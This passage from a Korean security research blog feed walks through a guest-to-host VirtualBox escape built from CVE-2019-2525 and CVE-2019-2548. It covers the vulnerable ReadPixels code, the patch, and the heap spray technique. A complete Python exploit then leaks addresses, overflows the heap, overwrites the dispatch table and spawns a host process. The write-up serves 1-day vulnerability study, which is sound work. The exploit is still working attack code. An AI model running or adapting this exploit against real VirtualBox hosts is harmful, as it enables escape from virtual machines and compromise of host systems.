class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> SERVER_DISPATCH_APIENTRY</span></span><br><span class="line"><span class="function"><span class="title">crServerDispatchReadPixels</span><span class="params">(GLint x, GLint y, GLsizei width, GLsizei height,</span></span></span><br><span class="line"><span class="params"><span class="function">                           GLenum format, GLenum type, GLvoid *pixels)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> GLint stride = READ_DATA( <span class="number">24</span>, GLint );</span><br><span class="line">    <span class="keyword">const</span> GLint alignment = READ_DATA( <span class="number">28</span>, GLint );</span><br><span class="line">    <span class="keyword">const</span> GLint skipRows = READ_DATA( <span class="number">32</span>, GLint );</span><br><span class="line">    <span class="keyword">const</span> GLint skipPixels = READ_DATA( <span class="number">36</span>, GLint );</span><br><span class="line">    <span class="keyword">const</span> GLint bytes_per_row = READ_DATA( <span class="number">40</span>, GLint );</span><br><span class="line">    <span class="keyword">const</span> GLint rowLength = READ_DATA( <span class="number">44</span>, GLint );</span><br><span class="line"></span><br><span class="line">    CRASSERT(bytes_per_row &gt; <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CR_ARB_pixel_buffer_object</span></span><br><span class="line">    <span class="keyword">if</span> (crStateIsBufferBound(GL_PIXEL_PACK_BUFFER_ARB))</span><br><span class="line">    &#123;</span><br><span class="line">        GLvoid *pbo_offset;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*pixels are actually a pointer to location of 8byte network pointer in hgcm buffer</span></span><br><span class="line"><span class="comment">          regardless of guest/host bitness we&#x27;re using only 4lower bytes as there&#x27;re no</span></span><br><span class="line"><span class="comment">          pbo&gt;4gb (yet?)</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        pbo_offset = (GLvoid*) ((<span class="keyword">uintptr_t</span>) *((GLint*)pixels));</span><br><span class="line"></span><br><span class="line">        cr_server.head_spu-&gt;dispatch_table.ReadPixels(x, y, width, height,</span><br><span class="line">                                                      format, type, pbo_offset);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#123;</span><br><span class="line">        CRMessageReadPixels *rp;</span><br><span class="line">        <span class="keyword">uint32_t</span> msg_len;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (bytes_per_row &lt; <span class="number">0</span> || bytes_per_row &gt; UINT32_MAX / <span class="number">8</span> || height &gt; UINT32_MAX / <span class="number">8</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            crError(<span class="string">&quot;crServerDispatchReadPixels: parameters out of range&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        msg_len = <span class="keyword">sizeof</span>(*rp) + (<span class="keyword">uint32_t</span>)bytes_per_row * height;</span><br><span class="line"></span><br><span class="line">        rp = (CRMessageReadPixels *) crAlloc( msg_len );</span><br><span class="line">        <span class="keyword">if</span> (!rp)</span><br><span class="line">        &#123;</span><br><span class="line">            crError(<span class="string">&quot;crServerDispatchReadPixels: out of memory&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Note: the ReadPixels data gets densely packed into the buffer</span></span><br><span class="line"><span class="comment">         * (no skip pixels, skip rows, etc.  It&#x27;s up to the receiver (pack spu,</span></span><br><span class="line"><span class="comment">         * tilesort spu, etc) to apply the real PixelStore packing parameters.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        cr_server.head_spu-&gt;dispatch_table.ReadPixels(x, y, width, height,</span><br><span class="line">                                                      format, type, rp + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        rp-&gt;header.type = CR_MESSAGE_READ_PIXELS;</span><br><span class="line">        rp-&gt;width = width;</span><br><span class="line">        rp-&gt;height = height;</span><br><span class="line">        rp-&gt;bytes_per_row = bytes_per_row;</span><br><span class="line">        rp-&gt;stride = stride;</span><br><span class="line">        rp-&gt;format = format;</span><br><span class="line">        rp-&gt;type = type;</span><br><span class="line">        rp-&gt;alignment = alignment;</span><br><span class="line">        rp-&gt;skipRows = skipRows;</span><br><span class="line">        rp-&gt;skipPixels = skipPixels;</span><br><span class="line">        rp-&gt;rowLength = rowLength;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* &lt;pixels&gt; points to the 8-byte network pointer */</span></span><br><span class="line">        crMemcpy( &amp;rp-&gt;pixels, pixels, <span class="keyword">sizeof</span>(rp-&gt;pixels) );</span><br><span class="line">    </span><br><span class="line">        crNetSend( cr_server.curClient-&gt;conn, <span class="literal">NULL</span>, rp, msg_len );</span><br><span class="line">        crFree( rp );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>crAlloc(msg_len)호출을 위해  msg_len값을 설정하는 부분에서 Integer Overflow가 발생한다.</li><li>항상 sizeof(rp)보다 큰 정수값을 반환할 거라 예상하지만 (sizeof(rp) == 0x38) ,</li><li>Integer Overflow를 통해 0x38보다 작은 특별한 크기 (0x20)으로 설정할 수 있다.</li><li>이를 이용해 Heap Overflow가 가능하다.</li></ul><h3 id="How-to-patch-1"><a href="#How-to-patch-1" class="headerlink" title="How to patch"></a>How to patch</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (bytes_per_row &lt;= <span class="number">0</span> || height &lt;= <span class="number">0</span> || bytes_per_row &gt; INT32_MAX / height)</span><br><span class="line">&#123;</span><br><span class="line">    crError(<span class="string">&quot;crServerDispatchReadPixels: parameters out of range&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">msg_len = <span class="keyword">sizeof</span>(*rp) + (<span class="keyword">uint32_t</span>)bytes_per_row * height;</span><br><span class="line"></span><br><span class="line">rp = (CRMessageReadPixels *) crAlloc( msg_len );</span><br></pre></td></tr></table></figure><ul><li>검증 조건이 수정되었다.</li></ul><hr><h2 id="Heap-Spray"><a href="#Heap-Spray" class="headerlink" title="Heap Spray"></a>Heap Spray</h2><ul><li>CVE-2019-2548에서 msg_len을 특별한 크기 0x20으로 설정 할 수 있다고 했다.<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">CRVBOXSVCBUFFER_t</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> uiId;</span><br><span class="line">    <span class="keyword">uint32_t</span> uiSize;</span><br><span class="line">    <span class="keyword">void</span>*    pData;</span><br><span class="line">    _CRVBOXSVCBUFFER_t *pNext, *pPrev;</span><br><span class="line">&#125; CRVBOXSVCBUFFER_t;</span><br></pre></td></tr></table></figure></li><li>여기서 0x20은 CRVBOXSVCBUFFER_t  구조체의 크기이다. </li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc_buf</span>(<span class="params">client, sz, msg=<span class="string">&#x27;a&#x27;</span></span>):</span></span><br><span class="line">    buf,_,_,_ = hgcm_call(client, SHCRGL_GUEST_FN_WRITE_BUFFER, [<span class="number">0</span>, sz, <span class="number">0</span>, msg])</span><br><span class="line">    <span class="keyword">return</span> buf</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crmsg</span>(<span class="params">client, msg, bufsz=<span class="number">0x1000</span></span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27; Allocate a buffer, write a Chromium message to it, and dispatch it. &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(msg) &lt;= bufsz</span><br><span class="line">    buf = alloc_buf(client, bufsz, msg)</span><br><span class="line">    <span class="comment"># buf,_,_,_ = hgcm_call(client, SHCRGL_GUEST_FN_WRITE_BUFFER, [0, bufsz, 0, msg])</span></span><br><span class="line">    _, res, _ = hgcm_call(client, SHCRGL_GUEST_FN_WRITE_READ_BUFFERED, [buf, <span class="string">&quot;A&quot;</span>*bufsz, <span class="number">1337</span>])</span><br><span class="line">    <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><ul><li>alloc_buf에서 할당한 메모리는 crmsg가 호출되기 전까지 Free되지 않는다..</li><li>따라서 아래와 같이 Heap Spray가 가능하다.</li></ul><p><img src="https://user-images.githubusercontent.com/49066484/139065357-da746ae5-34e2-4b20-b5d1-b416ebc7b834.png" alt="1"></p><ul><li>alloc_buf함수 호출, CRVBOXSVCBUFFER_t 객체 heap spray</li></ul><p><img src="https://user-images.githubusercontent.com/49066484/139065488-60fec681-590d-46bf-81e5-c7cd019c0709.png" alt="2"></p><ul><li>crmsg함수 호출, 짝수 bufID의 heap만 free</li></ul><p><img src="https://user-images.githubusercontent.com/49066484/139065563-1fb476d3-7146-43da-8e08-d5dc73d3a526.png" alt="3"></p><ul><li>crAlloc함수 호출, msg_len = 0x20인 CRMessageReadPixels 할당</li></ul><p><img src="https://user-images.githubusercontent.com/49066484/139065710-022d03b7-acce-4788-90ba-8dd15874d0ec.png" alt="4"></p><ul><li>Heap Overflow!!</li><li>구체적인 구조체 형태는 아래와 같다.</li></ul><p><img src="https://user-images.githubusercontent.com/49066484/139065764-0bad0be2-cbb6-40a9-b4c9-d61b35cd4f25.png" alt="5"></p><ul><li>heap overflow로 다음 chunk에 있던 CRVBOXSVCBUFFER_t 의 uiId와 uiSize 부분이 overwrite 된다.</li><li>overwrite된 uiID로 해당 공간에 접근할 수 있게된다.</li></ul><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="crSpawn-crServerDispatchBoundsInfoCR"><a href="#crSpawn-crServerDispatchBoundsInfoCR" class="headerlink" title="crSpawn, crServerDispatchBoundsInfoCR"></a>crSpawn, crServerDispatchBoundsInfoCR</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">CRpid <span class="title">crSpawn</span><span class="params">( <span class="keyword">const</span> <span class="keyword">char</span> *command, <span class="keyword">const</span> <span class="keyword">char</span> *argv[] )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> WINDOWS</span></span><br><span class="line"><span class="keyword">char</span> newargv[<span class="number">1000</span>];</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">STARTUPINFO si;</span><br><span class="line">PROCESS_INFORMATION pi;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">void</span>) command;</span><br><span class="line"></span><br><span class="line">ZeroMemory( &amp;si, <span class="keyword">sizeof</span>(si) );</span><br><span class="line">si.cb = <span class="keyword">sizeof</span>(si);</span><br><span class="line">ZeroMemory( &amp;pi, <span class="keyword">sizeof</span>(pi) );</span><br><span class="line"></span><br><span class="line">crStrncpy(newargv, argv[<span class="number">0</span>], <span class="number">1000</span> );</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; argv[i]; i++) &#123;</span><br><span class="line">crStrcat(newargv, <span class="string">&quot; &quot;</span>);</span><br><span class="line">crStrcat(newargv, argv[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( !CreateProcess(<span class="literal">NULL</span>, newargv, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, <span class="number">0</span>, <span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span>, &amp;si, &amp;pi) )</span><br><span class="line">&#123;</span><br><span class="line">crWarning(<span class="string">&quot;crSpawn failed, %d&quot;</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> pi.hProcess;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="keyword">pid_t</span> pid;</span><br><span class="line"><span class="keyword">if</span> ((pid = fork()) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* I&#x27;m the child */</span></span><br><span class="line"><span class="keyword">int</span> err = execvp(command, (<span class="keyword">char</span> * <span class="keyword">const</span> *) argv);</span><br><span class="line">crWarning(<span class="string">&quot;crSpawn failed (return code: %d)&quot;</span>, err);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">long</span>) pid;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>crSpawn 함수는 command를 입력받아 execvp를 호출한다.</li><li>crSpawn은 cr_unpackDispatch에 존재하는 함수지만, 직접 호출 할 수 없다.</li><li>crMessage의 opcode가 존재하는 함수에 한해서만 함수 호출을 할 수 있기 때문이다. </li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> SERVER_DISPATCH_APIENTRY</span></span><br><span class="line"><span class="function"><span class="title">crServerDispatchBoundsInfoCR</span><span class="params">( <span class="keyword">const</span> CRrecti *bounds, <span class="keyword">const</span> GLbyte *payload, GLint len, GLint num_opcodes )</span></span></span><br></pre></td></tr></table></figure><ul><li>crServerDispatchBoundsInfoCR함수의 인자는 crSpawn와 비슷하다.</li><li>CR_BOUNDSINFOCR_OPCODE는 crServerDispatchBoundsInfoCR 함수를 호출한다.</li></ul><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><ol><li>CVE-2019-2525로 필요한 메모리 주소 leak</li><li>CRVBOXSVCBUFFER_t 객체 heap spray 후, 짝수 buifID 객체 free</li><li>CVE-2019-2548로 CRMessageReadPixels 객체 할당, heap overflow</li><li>heap overflow를 통한 bufID overwrite</li><li>overwrite된 bufID로 Arbitrary write <ul><li><strong>cr_unpackDispatch에서의 crServerDispatchBoundsInfoCR 함수 주소를 crSpawn으로 overwrite.</strong></li></ul></li><li>CR_BOUNDSINFOCR_OPCODE의 msg를 보내 crSpawn 함수 호출</li><li>VM escape!</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys, os</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack, unpack</span><br><span class="line">sys.path.append(<span class="string">&quot;./3dpwn/lib&quot;</span>)</span><br><span class="line"><span class="keyword">from</span> chromium <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_mem</span>(<span class="params">offset</span>):</span></span><br><span class="line">        msg = (</span><br><span class="line">                pack(<span class="string">&quot;&lt;III&quot;</span>, CR_MESSAGE_OPCODES, <span class="number">0x41414141</span>, <span class="number">1</span>)</span><br><span class="line">                + <span class="string">&#x27;\x00\x00\x00&#x27;</span> + <span class="built_in">chr</span>(CR_EXTEND_OPCODE)</span><br><span class="line">                + pack(<span class="string">&quot;&lt;I&quot;</span>, offset)</span><br><span class="line">                + pack(<span class="string">&quot;&lt;I&quot;</span>, CR_GETATTRIBLOCATION_EXTEND_OPCODE)</span><br><span class="line">                + pack(<span class="string">&quot;&lt;I&quot;</span>, <span class="number">0x42424242</span>)</span><br><span class="line">                )</span><br><span class="line">        <span class="keyword">return</span> msg</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_pixel</span>():</span></span><br><span class="line">        msg = (</span><br><span class="line">                pack(<span class="string">&quot;&lt;III&quot;</span>, CR_MESSAGE_OPCODES, <span class="number">0x41414141</span>, <span class="number">1</span>)</span><br><span class="line">                + <span class="string">&#x27;\x00\x00\x00&#x27;</span> + <span class="built_in">chr</span>(CR_READPIXELS_OPCODE)</span><br><span class="line">                + pack(<span class="string">&quot;&lt;IIII&quot;</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>)</span><br><span class="line">                + pack(<span class="string">&quot;&lt;IIII&quot;</span>, <span class="number">0x35</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>)</span><br><span class="line">                + pack(<span class="string">&quot;&lt;IIII&quot;</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x1FFFFFFD</span>, <span class="number">0x00</span>)</span><br><span class="line">                + pack(<span class="string">&quot;&lt;II&quot;</span>, <span class="number">0xdeadbeef</span>, <span class="number">0xffffffff</span>)</span><br><span class="line">                )</span><br><span class="line">        <span class="keyword">return</span> msg</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">call_crCspawn</span>(<span class="params">addr</span>):</span></span><br><span class="line">        msg = (</span><br><span class="line">                pack(<span class="string">&quot;&lt;III&quot;</span>, CR_MESSAGE_OPCODES,<span class="number">0x41414141</span>,<span class="number">1</span>)</span><br><span class="line">                + <span class="string">&#x27;\x00\x00\x00&#x27;</span> + <span class="built_in">chr</span>(CR_BOUNDSINFOCR_OPCODE)</span><br><span class="line">                + pack(<span class="string">&quot;&lt;IQ&quot;</span>,<span class="number">0</span>,<span class="number">0x636c616378</span>)</span><br><span class="line">                + pack(<span class="string">&quot;&lt;III&quot;</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">                + pack(<span class="string">&quot;&lt;Q&quot;</span>,addr)</span><br><span class="line">                )</span><br><span class="line">        <span class="keyword">return</span> msg</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">        client = hgcm_connect(<span class="string">&quot;VBoxSharedCrOpenGL&quot;</span>)</span><br><span class="line">        set_version(client)     <span class="comment">#must use</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;[+] CVE-2019-2525/2548 PoC by rvkhun&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;[I] hgcm_connected&quot;</span>)</span><br><span class="line">        time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;[I] leak memory&quot;</span>)</span><br><span class="line">        offset = <span class="number">0xfffff618</span></span><br><span class="line">        msg = crmsg(client,leak_mem(offset))</span><br><span class="line"></span><br><span class="line">        crVBoxHGCMAlloc = unpack(<span class="string">&quot;&lt;Q&quot;</span>,msg[<span class="number">8</span>:<span class="number">16</span>])[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;[*] crVBoxHGCMAlloc : &quot;</span> + <span class="built_in">hex</span>(crVBoxHGCMAlloc))</span><br><span class="line"></span><br><span class="line">        crBoundsinfo = crVBoxHGCMAlloc + <span class="number">0x252a40</span></span><br><span class="line">        crDispatch = crVBoxHGCMAlloc + <span class="number">0x534e50</span></span><br><span class="line">        crSpawn = crVBoxHGCMAlloc - <span class="number">0xc160</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] crBoundsinfo : &quot;</span> + <span class="built_in">hex</span>(crBoundsinfo))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] crDispatch : &quot;</span> + <span class="built_in">hex</span>(crDispatch))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] crSpawn : &quot;</span> + <span class="built_in">hex</span>(crSpawn))</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;[I] heap spray&quot;</span>)</span><br><span class="line">        heap_list = []</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">                heap = alloc_buf(client,<span class="number">0x20</span>,<span class="string">&quot;H&quot;</span>*<span class="number">0x20</span>)</span><br><span class="line">                heap_list.append(heap)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;[I] free heap&quot;</span>)</span><br><span class="line">        heap_list = heap_list[::-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">for</span> heap <span class="keyword">in</span> heap_list[<span class="number">1</span>:<span class="number">5001</span>:<span class="number">2</span>]:</span><br><span class="line">                hgcm_call(client,SHCRGL_GUEST_FN_WRITE_READ_BUFFERED,[heap,<span class="string">&quot;A&quot;</span>,<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;[I] make pixel, heap overflow&quot;</span>)</span><br><span class="line">        crmsg(client,make_pixel())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        msg1 = pack(<span class="string">&quot;&lt;IIQ&quot;</span>,<span class="number">0xcafebabe</span>,<span class="number">0xffffffff</span>,crDispatch+<span class="number">0xd8</span>)</span><br><span class="line">        msg2 = pack(<span class="string">&quot;&lt;Q&quot;</span>,crSpawn)</span><br><span class="line">        msg3 = pack(<span class="string">&quot;&lt;IIQ&quot;</span>,<span class="number">0xcafebabe</span>,<span class="number">0xffffffff</span>,crDispatch)</span><br><span class="line">        msg4 = pack(<span class="string">&quot;&lt;Q&quot;</span>,<span class="number">0x636c616378</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;[I] overwrite dispatch table&quot;</span>)</span><br><span class="line">        hgcm_call(client,SHCRGL_GUEST_FN_WRITE_BUFFER,[<span class="number">0xdeadbeef</span>,<span class="number">0xffffffff</span>,<span class="number">0x90</span>,msg1])</span><br><span class="line">        hgcm_call(client,SHCRGL_GUEST_FN_WRITE_BUFFER,[<span class="number">0xcafebabe</span>,<span class="number">0xffffffff</span>,<span class="number">0x00</span>,msg2])</span><br><span class="line">        hgcm_call(client,SHCRGL_GUEST_FN_WRITE_BUFFER,[<span class="number">0xdeadbeef</span>,<span class="number">0xffffffff</span>,<span class="number">0x90</span>,msg3])</span><br><span class="line">        hgcm_call(client,SHCRGL_GUEST_FN_WRITE_BUFFER,[<span class="number">0xcafebabe</span>,<span class="number">0xffffffff</span>,<span class="number">0x00</span>,msg4])</span><br><span class="line"></span><br><span class="line">        crmsg(client,call_crCspawn(crDispatch))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><ul><li><a href="https://youtu.be/MHI2f1_EjNU">https://youtu.be/MHI2f1_EjNU</a></li></ul><p><img src="https://user-images.githubusercontent.com/49066484/139219869-181eb8c1-d989-47fb-a6b3-c0422106f3f1.png" alt="123"></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li>Virtualization Bug #1 Singi (멘토님 강의자료)</li><li><a href="https://github.com/niklasb/3dpwn">https://github.com/niklasb/3dpwn</a></li><li><a href="https://labs.f-secure.com/assets/BlogFiles/offensivecon-2019-3d-accelerated-exploitation-jason-matthyser.pdf">https://labs.f-secure.com/assets/BlogFiles/offensivecon-2019-3d-accelerated-exploitation-jason-matthyser.pdf</a></li><li><a href="https://wogh8732.tistory.com/273?category=804777">https://wogh8732.tistory.com/273?category=804777</a></li><li><a href="https://cosyp.tistory.com/247">https://cosyp.tistory.com/247</a></li><li><a href="https://1993-constant.tistory.com/590?category=927096">https://1993-constant.tistory.com/590?category=927096</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://pwnkidhn.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://pwnkidhn.github.io/tags/1-day/">1-day</category>
      
      <category domain="https://pwnkidhn.github.io/tags/CVE/">CVE</category>
      
      <category domain="https://pwnkidhn.github.io/tags/VM-Escape/">VM Escape</category>
      
      <category domain="https://pwnkidhn.github.io/tags/VirtualBox/">VirtualBox</category>
      
      
      <comments>https://pwnkidhn.github.io/2021/10/27/2021-10-28-CVE-2019-2525_2548_2/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>VM Escape using CVE-2019-2525/2548 (1)</title>
      <link>https://pwnkidhn.github.io/2021/10/25/2021-10-26-CVE-2019-2525_2548_1/</link>
      <guid>https://pwnkidhn.github.io/2021/10/25/2021-10-26-CVE-2019-2525_2548_1/</guid>
      <pubDate>Mon, 25 Oct 2021 15:00:00 GMT</pubDate>
      
      <description>&lt;ul&gt;
&lt;li&gt;CVE-2019-2525과 CVE-2019-2548을 이용한 VM exploit.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;Background&quot;&gt;&lt;a href=&quot;#Background&quot; class=&quot;headerlink&quot; title=&quot;Background&quot;&gt;&lt;/a&gt;Background&lt;/h2&gt;&lt;h3 id=&quot;3D-Acceleration&quot;&gt;&lt;a href=&quot;#3D-Acceleration&quot; class=&quot;headerlink&quot; title=&quot;3D Acceleration&quot;&gt;&lt;/a&gt;3D Acceleration&lt;/h3&gt;&lt;ul&gt;
